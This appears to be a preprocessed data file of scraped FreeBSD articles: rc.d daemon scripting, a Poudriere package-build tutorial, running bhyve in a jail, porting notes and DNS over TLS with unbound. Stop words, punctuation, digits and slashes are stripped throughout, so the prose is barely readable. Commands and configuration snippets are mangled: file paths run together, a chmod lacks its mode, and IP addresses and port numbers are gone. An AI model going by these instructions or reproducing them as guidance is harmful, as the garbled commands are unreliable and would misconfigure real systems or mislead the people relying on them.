scenario serving conventional daemon particular default method provided argument start stop restart poll statusthe daemon started running command commandline flag specified mumbledflags thus input data default start method available variable set script unlike start method may require additional information process started instance stop must know pid process terminate present case rcsubr scan list process looking process name equal procname latter another variable meaning rcsubr value default command word set command procname effectively set value enables script kill daemon check running first placenote program fact executable script system run script starting interpreter passing name script commandline argument reflected list process confuse rcsubr additionally set commandinterpreter let rcsubr know actual name process command scriptfor rcd script optional rcconf variable take precedence command name constructed follows name program name mandatory variable discussed earlier eg case mumbledprogram rcsubr arranges name program override commandof course sh permit set name program rcconf script even command unset case special property name program lost becomes ordinary variable script use purpose however sole use name program discouraged using together command became idiom rcd scriptingfor detailed information default method refer rcsubr startup shutdown advanced daemonlet u add meat onto bone previous script make complex featureful default method good job u may need aspect tweaked learn tune default method need binsh etcrcsubr namemumbled rcvarmumbledenable command usrsbin name commandargs mock argument devnull pidfile varrun name pid requiredfiles etc name conf usrsharemisc name rule sigreload startprecmd name prestart stoppostcmd echo byebye extracommands reload plugh xyzzy plughcmd mumbledplugh xyzzycmd echo nothing happens mumbledprestart checkyesno mumbledsmart rcflags smart rcflags fi case mumbledmode foo rcflags frotz rcflags bar rcflags baz rcflags warn invalid value mumbledmode return esac runrccommand xyzzy return mumbledplugh echo hollow voice say plugh loadrcconfig name runrccommand additional argument command passed commandargs added command line mumbledflags since final command line passed eval actual execution input output redirections specified commandargsnote never include dashed option like x foo commandargs content commandargs appear end final command line hence likely follow argument present name flag command recognize dashed option ordinary argument better way passing additional option command add beginning name flag another way modify rcflags shown later goodmannered daemon create pidfile process found easily reliably variable pidfile set tell rcsubr find pidfile default method usenote fact rcsubr also use pidfile see daemon already running starting check skipped using faststart argument daemon run unless certain file exist list requiredfiles rcsubr check file exist starting daemon also requireddirs requiredvars directory environment variable respectively described detail rcsubr note default method rcsubr forced skip prerequisite check using forcestart argument script customize signal send daemon case differ wellknown one particular sigreload specifies signal make daemon reload configuration sighup default another signal sent stop daemon process default sigterm changed setting sigstop appropriatelynote signal name specified rcsubr without sig prefix shown example freebsd version kill recognize sig prefix version o type may performing additional task default method easy commandargument supported script define argumentprecmd argumentpostcmd sh command invoked respective method evident namesnote overriding default method custom argumentcmd still prevent u making use argumentprecmd argumentpostcmd need particular former good checking custom sophisticated condition met performing command using argumentprecmd along argumentcmd let u logically separate check actiondo forget cram valid sh expression method pre postcommands define invoking function make real job good style case never let style limit understanding going behind curtain would like implement custom argument also thought command script need list extracommands provide method handle themnote reload command special one hand preset method rcsubr hand reload offered default reason daemon use reload mechanism nothing reload need ask explicitly builtin functionality provided via extracommandswhat get default method reload quite often daemon reload configuration upon reception signal typically sighup therefore rcsubr attempt reload daemon sending signal signal preset sighup customized via sigreload necessary script support two nonstandard command plugh xyzzy saw listed extracommands time provide method method xyzzy inlined plugh implemented mumbledplugh functionnonstandard command invoked startup shutdown usually system admin convenience also used subsystem eg devd specified devdconf full list available command found usage line printed rcsubr script invoked without argument example usage line script study etcrcdmumbled usage etcrcdmumbled fastforceone startstoprestartrcvarreloadplughxyzzystatuspoll script invoke standard nonstandard command needed may look similar calling function know command shell function always thing instance xyzzy implemented function addition precommand postcommand invoked orderly proper way script run command mean rcsubr shown example handy function named checkyesno provided rcsubr take variable name argument return zero exit code variable set yes true case insensitive nonzero exit code returned otherwise latter case function test variable set false case insensitive print warning message variable contains anything else ie junkkeep mind sh zero exit code mean true nonzero exit code mean falseimportant checkyesno function take variable name pas expanded value variable work expectedthe following correct usage checkyesno checkyesno mumbledenable foo fion contrary calling checkyesno shown work least expected checkyesno mumbledenable foo fi affect flag passed command modifying rcflags startprecmd certain case may need emit important message go syslog well done easily following rcsubr function debug info warn err latter function exit script code specified exit code method precommands ignored default argumentprecmd return nonzero exit code main method performed turn argumentpostcmd invoked unless main method return zero exit codenote however rcsubr instructed command line ignore exit code invoke command anyway prefixing argument force connecting script rcd frameworkafter script written need integrated rcd crucial step install script etcrcd base system usrlocaletcrcd port bsdprogmk bsdportmk provide convenient hook usually worry proper ownership mode system script installed srcetcrcd makefile found port script installed using usercsubr described porter handbookhowever consider beforehand place script system startup sequence service handled script likely depend service instance network daemon function without network interface routing running even service seems demand nothing hardly start basic filesystems checked mountedwe mentioned rcorder already time close look nutshell rcorder take set file examines content print dependencyordered list file set stdout point keep dependency information inside file file speak file specify following information name condition mean service u provides name condition requires name condition file run additional keywords used select subset whole set file rcorder instructed via option include omit file particular keywords listed surprise rcorder handle text file syntax close sh special line understood rcorder look like sh comment syntax special line rather rigid simplify processing see rcorder detailsbesides using rcorder special line script insist dependency upon another service starting forcibly needed service optional start system admin disabled mistakenly rcconf general knowledge mind let u consider simple daemon script enhanced dependency stuff binsh provide mumbled oldmumble require daemon cleanvar frotz login keyword nojail shutdown etcrcsubr namemumbled rcvarmumbledenable command usrsbin name startprecmd name prestart mumbledprestart checkyesno frotzenable etcrcdfrotz forcestatus devnull forcedepend frotz return fi return loadrcconfig name runrccommand detailed analysis follows line declares name condition script provides script record dependency script namesnote usually script specifies single condition provided however nothing prevents u listing several condition eg compatibility reasonsin case name main provide condition name script indicates condition provided script depends according line script asks rcorder put script providing daemon cleanvar providing loginnote line abused work around incomplete dependency list script appropriate case using script care script task better run one typical reallife example network interface v firewall interface depend firewall job system security benefit firewall ready network trafficbesides condition corresponding single service metaconditions placeholder script used ensure certain group operation performed others denoted uppercase name list purpose found rc keep mind putting service name require line guarantee service actually running time script start required service may fail start disabled rcconf obviously rcorder track detail rc either consequently application started script able cope required service unavailable certain case help discussed remember text rcorder keywords used select leave script namely rcorder consumer specify k option keywords keep list skip list respectively file dependency sorted rcorder pick keyword keep list unless empty keyword skip listin freebsd rcorder used etcrc etcrcshutdown two script define standard list freebsd rcd keywords meaning follows nojailthe service jail environment automatic startup shutdown procedure ignore script inside jailnostartthe service started manually started automatic startup procedure ignore script conjunction shutdown keyword used write script something system shutdownshutdownthis keyword listed explicitly service need stopped system shutdownnote system going shut etcrcshutdown run assumes rcd script nothing time therefore etcrcshutdown selectively invokes rcd script shutdown keyword effectively ignoring rest script even faster shutdown etcrcshutdown pass faststop command script run skip preliminary check eg pidfile check dependent service stopped prerequisite etcrcshutdown run script reverse dependency orderif writing real rcd script consider whether relevant system shutdown time eg script work response start command need include keyword however script manages service probably good idea stop system proceeds final stage shutdown sequence described halt particular service stopped explicitly need considerable time special action shut cleanly typical example service database engine begin forcedepend used much care generally better revise hierarchy configuration variable rcd script interdependentif still without forcedepend example offer idiom invoke conditionally example mumbled daemon requires another one frotz started advance however frotz optional rcorder know nothing detail fortunately script access rcconf variable frotzenable true hope best rely rcd started frotz otherwise forcibly check status frotz finally enforce dependency frotz found running warning message emitted forcedepend invoked misconfiguration giving flexibility rcd scriptwhen invoked startup shutdown rcd script supposed act entire subsystem responsible eg etcrcdnetif start stop network interface described rcconf either task uniquely indicated single command argument start stop startup shutdown rcd script help admin control running system need flexibility precision arises instance admin may want add setting new network interface rcconf start without interfering operation existing interface next time admin may need shut single network interface spirit command line respective rcd script call extra argument interface namefortunately rcsubr allows passing number argument script method within system limit due change script minimalhow rcsubr gain access extra commandline argument grab directly mean firstly sh function access positional parameter caller rcsubr sack function secondly good manner rcd dictate main script decide argument passed methodsso approach adopted rcsubr follows runrccommand pass argument first one respective method verbatim first omitted argument name method start stop etc shifted runrccommand original command line presented method onto illustrate opportunity let u modify primitive dummy script message depend additional argument supplied go binsh etcrcsubr name dummy startcmd name start stopcmd kisscmd name kiss extracommands kiss dummystart gt echo greeting message else echo nothing started fi dummykiss echo n ghost give kiss gt echo n whisper fi case echo echo esac loadrcconfig name runrccommand essential change notice script argument type start end positional parameter respective method use way according task skill fancy current example pas echo one string next line note within double quote script invoked etcrcddummy start nothing started etcrcddummy start hello world greeting message hello world applies method script provides standard one added custom method named kiss take advantage extra argument le start eg etcrcddummy kiss ghost give kiss etcrcddummy kiss etaoin shrdlu ghost give kiss whisper etaoin shrdlu want pas extra argument method merely substitute last line script invoke runrccommandimportant sh programmer ought understand subtle difference way designate positional parameter indepth discussion refer good handbook sh scripting use expression fully understand misuse result buggy insecure scriptsnote currently runrccommand may bug prevents keeping original boundary argument argument embedded whitespace may processed correctly bug stem misusethe original article luke mewburn offer general overview rcd detailed rationale design decision provides insight whole rcd framework place modern bsd operating systemthe manual page rc rcsubr rcorder document rcd component great detail fully use rcd power without studying manual page referring writing scriptsthe major source working reallife example etcrcd live system content easy pleasant read rough corner hidden deep rcsubr keep mind though etcrcd script written angel might suffer bug suboptimal design decision improve
302,Lobsters,freebsd,FreeBSD,How To Set Up a Poudriere Build System (2015),https://www.digitalocean.com/community/tutorials/how-to-set-up-a-poudriere-build-system-to-create-packages-for-your-freebsd-servers,set poudriere build system,introduction poudriere install necessary port management software create ssl certificate key configuring poudriere creating build environment creating port building list setting port option building port note setting nginx serve front end repository configuring package client configuring build server use package repo configuring remote client use build machine repository local computer rebuilding package update available conclusion,introduction port system one freebsd greatest asset user want flexibility control software allows administrator easily create maintain sourcebased installation using system designed robust predictable advantage feature great common complaint levied portsbased administration regarding time resource required compile piece software becomes even issue managing large number server compiles port freebsd package provide alternative speed installation sacrifice control port grant alleviate issue administrator use application called poudriere build maintain custom package technically created build package variety architecture poudriere often used package building environment create host package entire infrastructure freebsd server leveraging poudriere administrator customize software necessary using port system compile package easy installation software management number freebsd server use host poudriere installed package source allowing download install customized precompiled executables quickly easily guide demonstrate set server poudriere build machine use server repository package additional server setup beneficial single server real efficiency gain seen additional server begin using poudriere host package source since port building resource intensive process may worthwhile set powerful system usual install necessary port management software start install port need always beginning portsrelated task update port tree make sure reference filesystem fresh sudo portsnap fetch update port tree updated begin installing software first need install poudriere found portsmgmt category port tree build install go directory use make compile install cd usrportsportsmgmtpoudriere sudo make install clean feel free select option presented standard build none essential next already installed need install portmaster port use easily generate list software machine want poudriere build portsmgmt category well cd usrportsportsmgmtportmaster sudo make install clean finally also want install web server serve two purpose first method machine able download package compiling secondly poudriere provides web interface keep track build process monitor log guide using nginx web server found www category port tree cd usrportswwwnginx sudo make install clean accept default value customize specific need another purpose finished compiling installing software make sure reevaluate path using default tcsh csh shell rehash software installed begin configure component create ssl certificate key build package poudriere want able sign private key ensure machine package created legitimate nobody intercepting connection build machine serve malicious package start create directory structure key certificate since optional software configuration take place within usrlocaletc directory software us usrlocaletcssl location place file ensure ssl directory contains two subdirectory called key cert one command typing sudo mkdir p usrlocaletcssl key cert private key must kept secret placed key directory used sign package creating keeping secure essential ensuring package tampered lock directory user without root sudo privilege unable interact directory content sudo chmod usrlocaletcsslkeys cert directory contain publicly available certificate created key leave default permission directory next generate bit key called poudrierekey place key directory typing sudo openssl genrsa usrlocaletcsslkeyspoudrierekey key generated create public cert typing sudo openssl rsa usrlocaletcsslkeyspoudrierekey pubout usrlocaletcsslcertspoudrierecert ssl component need sign package verify signature later configure client use generated certificate package verification configuring poudriere ssl certificate key begin configure poudriere main configuration file located usrlocaletcpoudriereconf open file sudo privilege text editor sudo vi usrlocaletcpoudriereconf poudriere configuration file well commented setting need predefined making specific change leaving majority intact freebsd server running digitalocean filesystem ufs zfsspecific option within poudriere set indicate using ufs must set nozfs flag yes find uncomment option within file nozfsyes hand server us zfs configure poudriere use specific pool setting zpool option within pool specify root poudriere use package log etc zrootfs option note two option set nozfs option set yes nozfsyes zpooltank zrootfspoudriere building software poudriere us type jail order separate build system main operating system next must fill valid host build machine download software need jail configured freebsdhost option option already present although currently set valid host change default ftp ftpfreebsdorg location use closer mirror know one freebsdhostftp ftpfreebsdorg next want sure data directory within poudriere root set correctly controlled poudrieredata option defaulted uncomment option sure poudrieredata basefs data next option uncomment checkchangedoptions checkchangeddeps option first option tell poudriere rebuild package option changed second option tell tell poudriere rebuild package dependency changed since last compilation option exist form want configuration file need uncomment checkchangedoptionsverbose checkchangeddepsyes next point poudriere ssl key created sign package build option used specify called pkgreposigningkey uncomment option change path reflect location ssl key created earlier pkgreposigningkeyusrlocaletcsslkeyspoudrierekey finally set urlbase string domain name ip address server reached used poudriere construct link output clicked include protocol end value slash urlbasehttp serverdomainorip finished making change save close file creating build environment next need actually construct build environment mentioned earlier poudriere build port isolated environment using jail create jail poudriere install freebsd inside possible multiple jail different version freebsd jailed freebsd version must older version server running guide focusing single jail mirror architecture freebsd version host system choose descriptive name jail creating important since used repository configuration client important building different version freebsd man page also instruct avoid using dot name due interaction tool instance guide operating freebsd architecture call specify name jail j indicate version freebsd install using v option find format supported release release column table page following current stable instead release use format found page purpose jail construction command look like sudo poudriere jail c j v take awhile complete patient finished see installed jail typing poudriere jail l jailname version arch method timestamp path ftp jail created install port tree possible maintain multiple port tree order serve different development need installing single port tree jail utilize use p flag name port tree call tree head accurately summarizes use tree head uptodate point tree updating regularly match current version port tree available sudo poudriere port c p head procedure take awhile entire port tree must fetched extracted finished view port tree typing poudriere port l step complete structure place compile port build package next start assemble list port build configure option want piece software creating port building list setting port option compiling poudriere indicate port wish build calling build command possible specify port individually good solution longterm management instead creating list port pas directly command file create list port category followed slash port name reflect location within port tree like portcategoryfirstport portcategorysecondport portcategorythirdport needed dependency automatically built well worry tracking entire dependency tree port wish install build file manually base system already software want build use portmaster create list usually good idea remove unneeded dependency system keep port list clean possible typing sudo pkg autoremove afterwards get list software explicitly installed build system using portmaster portmaster command output list explicitly installed port dependency correct format using listorigins option pipe output sort alphabetize list make easier find item output result file usrlocaletcpoudriered directory call file portlist portmaster listorigins sort sudo tee usrlocaletcpoudrieredportlist review list port wish include remove associated line also opportunity add additional port might need use specific makeconf option build port create makeconf file jail within usrlocaletcpoudriered directory example jail create makeconf file name sudo vi inside put option would like use building port instance want build documentation example native language support support set optionsunset doc nls example afterwards configure port create file option selected customized port host system copy configuration poudriere utilize setting create new directory within usrlocaletcpoudriered directory named jail option appended end guide accomplish typing sudo mkdir copy option already using host system typing sudo cp r vardbports complete step baseline option configuring many dependency still need configured configure anything already configured using option command pas port tree created using p option jail setting option using j option also must specify list port want configure using f option command look like sudo poudriere option j p head f usrlocaletcpoudrieredportlist see dialog port list dependency corresponding option set option directory specification makeconf file preselected selection screen select option would like use wish reconfigure option port future rerun command c option show available configuration option regardless whether made selection past sudo poudriere option c j p head f usrlocaletcpoudrieredportlist building port finally ready start building port last thing need ensure jail port tree uptodate probably issue first time build port since created port tree jail good get habit time run build update jail type sudo poudriere jail u j update port tree type sudo poudriere port u p head complete kick bulk build process note long running process connected server ssh recommend install screen start session cd usrportssysutilsscreen sudo make install clean rehash screen start build need use bulk command point individual piece configuring using value guide command look like sudo poudriere bulk j p head f usrlocaletcpoudrieredportlist start number worker depending poudriereconf file number cpu available begin building port time build process get information progress holding ctrl key hitting ctrlt certain part process produce output others need step away detach screen session hitting ctrl move control screen followed key detach session ctrla wish return session type screen x setting nginx serve front end repository package building take opportunity configure nginx open another terminal detach screen session shown start new screen window typing ctrla c switch window typing ctrla n ctrla p web server used two distinct purpose serve actual package repository host use download custom compiled package serve poudriere web frontend used monitor build process installed nginx beginning guide configured begin enable service adding nginxenable yes line etcrcconf file start server boot allow u use conventional service command manage process sudo sh c echo nginxenable yes etcrcconf adjust default configuration file open sudo privilege text editor sudo vi usrlocaletcnginxnginxconf within file remove everything server block replace configuration make sure leave matching brace intact ensure file valid within server context set basic directive allow web server respond conventional http traffic port respond server domain name ip address also set document root server poudriere web directory found usrlocalsharepoudrierehtml change value servername directive match server domain name ip address http context server listen default servername serverdomainorip root usrlocalsharepoudrierehtml next add two location block basic root directive defined handle majority web interface need tell nginx directory store log actual data poudriere use data endpoint log written specific directory turn autoindex directive location view list log end first location block look like http context server listen default servername serverdomainorip root usrlocalsharepoudrierehtml location data alias usrlocalpoudrieredatalogsbulk autoindex make web interface function correctly additional modification mimetypes file make moment next need add second location block used serve actual package building package stored directory usrlocalpoudriere time datapackages make available package location turn autoindex view content directory allowing u also view file web browser final modification complete server block look like http context server listen default servername serverdomainorip root usrlocalsharepoudrierehtml location data alias usrlocalpoudrieredatalogsbulk autoindex location package root usrlocalpoudrieredata autoindex save close file finished next make one small modification mimetypes file current setting click log web browser download file instead displaying plain text change behavior marking file ending log plain text file open nginx mimetypes file sudo privilege text editor sudo vi usrlocaletcnginxmimetypes find entry specifies textplain content type append log end current list filetypes separated space textmathml mml textplain txt log jad save close file finished check syntax configuration file typing sudo service nginx configtest error fix proceeding configuration test report syntax error start nginx typing sudo service nginx start firewall enabled remember configure rule allow traffic port restart service view poudriere web interface going server domain name ip address web browser http serverdomainorip see main poudriere page click able view process result port building also able click log build finished want view compiled package browser available hierarchy starting package may wait entire build complete order see package clicking link show compiled package produced poudriere bulk build command configuring package client package built repository configured serve package configure client use server source package configuring build server use package repo begin configuring build server use package building first need make directory hold repository configuration file sudo mkdir p usrlocaletcpkgrepos inside directory create repository configuration file must end conf call poudriereconf reflect purpose sudo vi usrlocaletcpkgrepospoudriereconf define repository name poudriere inside definition point location disk package stored directory combine jail name port tree name dash check filesystem certain also set signature validation package pointing certificate created end file look something like poudriere url file mirrortype srv signaturetype pubkey pubkey usrlocaletcsslcertspoudrierecert enabled yes point need make decision want prefer compiled package fall back package provided main freebsd repository set priority telling prefer package repository cause local repository take priority official repository keep mind mixing package way complicated consequence official repository package version higher local repository version compiled package may replaced generic one official repository rebuild poudriere reinstall pkg also official package may assume dependent package built certain way may function mixed custom package choose mix two package source prepared carefully audit install ensure accidentally causing undesirable behavior mix package add priority setting repository definition specifying local repo higher precedence poudriere url file mirrortype srv signaturetype pubkey pubkey usrlocaletcsslcertspoudrierecert enabled yes priority save close file finished chose install package custom built safer route leave priority setting want disable default repository creating different repo file override default repository file disables sudo vi usrlocaletcpkgreposfreebsdconf inside use name freebsd order match default repository definition disable repository defining like freebsd enabled save close file finished regardless configuration choice ready use repository update package list typing sudo pkg update server use pkg command install package local repository configuring remote client use build machine repository one compelling reason set poudriere build machine use host repository many machine need make work download public ssl cert build machine set similar repository definition order connect build host client machine start ssh agent local computer store ssh key credential openssl come ssh agent started typing home computer eval sshagent next need add ssh key typing sshadd afterwards forward local ssh credential client machine connect using flag allow access machine client machine accessing home machine ssh freebsd clientdomainorip remote client machine first step create directory structure exist store certificate go ahead create directory key use future task sudo mkdir p usrlocaletcssl key cert connect build machine ssh pipe certificate file back client machine since forwarded ssh credential able without prompted password ssh freebsd serverdomainorip cat usrlocaletcsslcertspoudrierecert sudo tee usrlocaletcsslcertspoudrierecert command connect build machine client machine using local ssh credential connected display content certificate file pipe ssh tunnel back remote client machine use sudo tee combination write certificate directory complete make repository directory structure build machine sudo mkdir p usrlocaletcpkgrepos create repository file similar one used build machine sudo vi usrlocaletcpkgrepospoudriereconf difference url location mirror type either choose mix package use custom compiled package warning apply regard mixing package source want mix custom package official repository file look something like poudriere url http mirrortype http signaturetype pubkey pubkey usrlocaletcsslcertspoudrierecert enabled yes priority want use compiled package file look something like poudriere url http mirrortype http signaturetype pubkey pubkey usrlocaletcsslcertspoudrierecert enabled yes addition using package remember create another repository config file override default freebsd repository configuration sudo vi usrlocaletcpkgreposfreebsdconf place following content file disable official repository freebsd enabled finished update pkg database begin using custom compiled package sudo pkg update procedure repeated many freebsd client machine would like rebuilding package update available entire poudriere setup running however need rebuild package timetotime new update become available especially security related fortunately procedure rebuilding package rather straight forward first update freebsd jail package built uptodate operating system typing sudo poudriere jail u j next update port tree latest version port available jail typing sudo poudriere port u p head jail port tree updated modify port list change want make sudo vi usrlocaletcpoudrieredportlist need adjust makeconf option editing file associated build sudo vi check new option port typing sudo poudriere option j p head f usrlocaletcpoudrieredportlist would like instead review option port add c flag helpful troubleshooting build runtime issue sudo poudriere option c j p head f usrlocaletcpoudrieredportlist completed preparatory step recompile port altered updated typing sudo poudriere bulk j p head f usrlocaletcpoudrieredportlist feel free monitor progress web interface new package compiled updated package machine typing sudo pkg upgrade allow update custom package entire freebsd infrastructure quite easily conclusion guide covered configure poudriere compile package custom set port build machine external client process might seem lengthy first glance rather simple manage running leveraging poudriere able take advantage freebsd optional software management system many user constitutes best world poudriere build system allows customize software see fit single machine utilizing fast pkg system actual installation management
303,Lobsters,freebsd,FreeBSD,FreeBSD 12 has been branched into -STABLE,https://svnweb.freebsd.org/base/stable/12/,freebsd branched stable,svn mergeinfo,svn mergeinfo
304,Lobsters,freebsd,FreeBSD,Jailing the bhyve hypervisor,https://github.com/lattera/articles/blob/master/freebsd/2018-10-27_jailed_bhyve/article.md,jailing bhyve hypervisor,jailing bhyve hypervisor gentle history lesson initial setup freebsd handbook conclusion,jailing bhyve hypervisor freebsd nears final release engineering cycle like take moment document cool new feature coming jailed bhyve may notice use hardenedbsd instead freebsd article functional difference bhyve hardenedbsd versus bhyve freebsd difference hardenedbsd freebsd aditional security offered hardenedbsd step outline work freebsd hardenedbsd bare minimum step extra work needed either freebsd hardenedbsd gentle history lesson work spare time helping develop malware lab due nature beast would like use bhyve hardenedbsd starting hardenedbsd noncrossdso cfi safestack capsicum aslr strict wx applied bhyve making extremely hardened hypervisor work support jailed bhyve sponsored hardenedbsd employer also jointly worked bhyve hardening feature like protecting vm address space using guard page mmap mapguard work done project called malhyve modification bhyvemalhyve make sense upstream upstreamed initial setup go process creating jail filesystem process documented freebsd handbook uefi guest need install package inside jail network jail traditional jail networking tested vnet jail setup work fine however real need hook jail network long bhyve access tap device case vm might need networking case use networkless vm networkless jail default access kernel side bhyve disabled within jail need set allowvmm jailconf entry bhyve jail use following jail need set devfs rule zfs volume nullmodem device nmdm uefi gop devfs rule ip assigned jail tap device etcdevfsrules file add include devfsrulesjail add path vmm unhide add path vmm unhide add path tap unhide add path zvoltankbhyve unhide add path nmdm unhide notice ruleset assigned index number flexible another ruleset index please choose different index article keep mind need adjust use index later article change let set etcjailconf file reference devfs rule set execstart binsh etcrc execstop binsh etcrcshutdown execclean mountdevfs path usrjails name hosthostname name devfsruleset allowvmm persist let set etcrcconf right parameter next part contains variable setting may conflict existing setup need modify fit particular setup clonedinterfaces addm addm jailenable yes jailparallelstart yes point would reboot system jail created started boot time able run bhyve use usrshareexamplesbhyvevmrunsh script included freebsdhardenedbsd base ssh jexec jail running sh usrshareexamplesbhyvevmrunsh c c e p conclusion bhyve hypervisor work great within jail combined hardenedbsd bhyve extremely hardened pax aslr fully applied due compilation positionindependent executable hardenedbsd enhancement pax noexec fully applied strict wx hardenedbsd enhancement noncrossdso cfi fully applied hardenedbsd enhancement full relro relro bindnow fully applied hardenedbsd enhancement safestack applied application hardenedbsd enhancement jailed freebsd feature written hardenedbsd virtual memory protected guard page freebsd feature written hardenedbsd capsicum fully applied freebsd feature bad guy going hard time breaking userland component bhyve hardenedbsd
306,Lobsters,freebsd,FreeBSD,What I learned from porting to freebsd,https://github.com/shlomif/what-i-learned-from-porting-to-freebsd/blob/master/README.asciidoc,learned porting freebsd,permalink join github today sign learned porting project freebsd introduction freebsd project http githubcomshlomifshlomifcomputersettings http webcpanshlomifishorglatemp http fcsolveshlomifishorg http wwwshlomifishorgopensourceprojectsblackholesolitairesolver http betterscmshlomifishorgsource http perlbeginorgsource http wwwshlomifishorgmetasitesource website meta language http enwikipediaorgwikitravisci learned freebsd vbox become reliable executables freebsd usrlocalbin instead usrbin make freebsd gnu make freebsd compatible gnu cpan module fail install using locallib docbookxsl live usrsharesgml freebsd grep p flag default freebsd nproc command still work bug hunspell continuation sequel update reload reload,permalink dismiss join github today github home million developer working together host review code manage project build software together sign retrieve contributor time line sloc kb learned porting project freebsd introduction set local freebsd virtualbox vm test something seems work well due novelty factor decided get software project build pas test project http githubcomshlomifshlomifcomputersettings dotfiles http webcpanshlomifishorglatemp http fcsolveshlomifishorg http wwwshlomifishorgopensourceprojectsblackholesolitairesolver http betterscmshlomifishorgsource http perlbeginorgsource http wwwshlomifishorgmetasitesource written using mix c perl python ruby gnu bash xml cmake xslt website meta language javascript work fine several linux distribution http enwikipediaorgwikitravisci using ubuntu host pas build test learned freebsd vbox become reliable executables freebsd usrlocalbin instead usrbin linux almost always usrbin make freebsd gnu make freebsd compatible gnu cpan module fail install using locallib docbookxsl live usrsharesgml freebsd grep p flag default freebsd nproc command still work valgrind test fail possibly due bug spellchecking test fail like ubuntu seems hunspell systemdependent dictionary continuation sequel update perform action time signed another tab window reload refresh session signed another tab window reload refresh session
307,Lobsters,freebsd,FreeBSD,DNS over TLS in FreeBSD 12,https://blog.des.no/2018/10/dns-over-tls-in-freebsd-12/,dns tl freebsd,change setup init script dns tl basic setup cloudflare dns service localunboundtls yes performance revisiting configuration cloudflare documentation cloudflarednscom cloudflarednscom conclusion quic,arrival openssl upgraded unbound change setup init script freebsd currently beta support dns tl box show set discus advantage disadvantage arrival openssl upgraded unbound change setup init script freebsd currently beta support dns tl box dns tl sound like dns tcp wrapped tl session encrypts request server reply optionally allows verify identity server advantage protection eavesdropping manipulation dns traffic drawback slight performance degradation potential firewall traversal issue run nonstandard port tcp port may blocked network let take look set basic setup simple test case let set vm use cloudflare dns service uname cat etcrcconfdlocalunbound eoflocalunboundenable yes localunboundtls yes localunboundforwarders eof service localunbound startperforming initial setupdestination varunboundforwardconf createdvarunboundlanzonesconf createdvarunboundcontrolconf createdvarunboundunboundconf createdetcresolvconfconf modifiedoriginal etcresolvconf saved localunboundwaiting nameserver start good host wwwfreebsdorgwwwfreebsdorg alias address address mail handled note configuration want run come back later performance downside dns tl performance hit tcp tl session setup teardown demonstrate flushing cache rather crudely measuring cache miss cache hit localunboundcontrol reloadok time host wwwfreebsdorg xhost wwwfreebsdorg x user system cpu total time host wwwfreebsdorg xhost wwwfreebsdorg x user system cpu total compare querying router puny soekris running unbound freebsd time host wwwfreebsdorg gw xhost wwwfreebsdorg gw x user system cpu total time host wwwfreebsdorg xhost wwwfreebsdorg gw x user system cpu total querying cloudflare directly udp time host wwwfreebsdorg x host wwwfreebsdorg x user system cpu total time host wwwfreebsdorg xhost wwwfreebsdorg x user system cpu total cloudflare us anycast routing unreasonable see cache miss offpeak hour clearly show advantage running local caching absorbs cost dnssec tl speaking dnssec separate cost tl reconfiguring server without latter cat etcrcconfdlocalunbound eoflocalunboundenable yes localunboundtls localunboundforwarders eof service localunbound setupperforming initial setupdestination original varunboundforwardconf saved modifiedvarunboundcontrolconf modifiedoriginal varunboundunboundconf saved modifiedetcresolvconf modified service localunbound startstarting localunboundwaiting nameserver start good time host wwwfreebsdorg xhost wwwfreebsdorg x user system cpu total time host wwwfreebsdorg xhost wwwfreebsdorg x user system cpu total tl add nearly half second every cache miss quite previous test first query cache miss also first query restart cache flush resulting complete load validation entire path name queried root difference first second cache miss quite noticeable time host wwwfreebsdorg x host wwwfreebsdorg x user system cpu total time host wwwfreebsdorg xhost wwwfreebsdorg x user system cpu total time host repofreebsdorg xhost repofreebsdorg x user system cpu total time host repofreebsdorg xhost repofreebsdorg x user system cpu total revisiting configuration remember said run sample configuration production get back later later problem first configuration encrypts dns traffic verify identity server isp could routing traffic server logging selling information highest bidder need tell unbound validate server certificate catch unbound know ip address forwarders name provide name match certificate used server want use let doublecheck certificate openssl sclient connect openssl noout text grep dns dns cloudflarednscom ip ip dns cloudflarednscom ip ip match cloudflare documentation let update configuration cat etcrcconfdlocalunbound eoflocalunboundenable yes localunboundtls yes localunboundforwarders cloudflarednscom cloudflarednscom eof service localunbound setup performing initial setupdestination original varunboundforwardconf saved modifiedvarunboundcontrolconf modifiedvarunboundunboundconf modifiedetcresolvconfconf modifiedetcresolvconf modified service localunbound restartstopping localunboundstarting localunboundwaiting nameserver start good host wwwfreebsdorgwwwfreebsdorg alias address address mail handled confirm unbound actually validates certificate well run unbound debug mode usrsbinunbound dd vvv read debugging confirm fails given name match certificate perl p e scloudflarecloudfireg etcrcconfdlocalunbound service localunbound setupperforming initial setupdestination original varunboundforwardconf saved modifiedvarunboundcontrolconf modifiedvarunboundunboundconf modifiedetcresolvconfconf modifiedetcresolvconf modified service localunbound restartstopping localunboundwaiting pid localunboundwaiting nameserver start good host wwwfreebsdorghost wwwfreebsdorg found servfail really failure validate certificate actually provided server name unbound pas server tl handshake server reject handshake name match certificate truly verify unbound validates server certificate confirm fails instance remove root certificate used sign dns server certificate test system trust store note simply remove trust store entirely unbound refuse start trust store missing empty talking trust store point currently must carootnss installed dns tl work however ship preinstalled copy conclusion seen set localunbound service freebsd use dns tl instead plain udp tcp using cloudflare public dns service example looked performance impact ensure verify unbound validates server certificate prevent maninthemiddle attack question remains whether worth undeniably performance hit though may improve tl importantly currently dnsovertls one really since filter weigh advantage encrypting dns traffic disadvantage sending single organization answer question tell parameter evolving quickly answer negative today may remain long provider appear performance improve tl quic within year two running dns tl may well become rule rather experimental exception
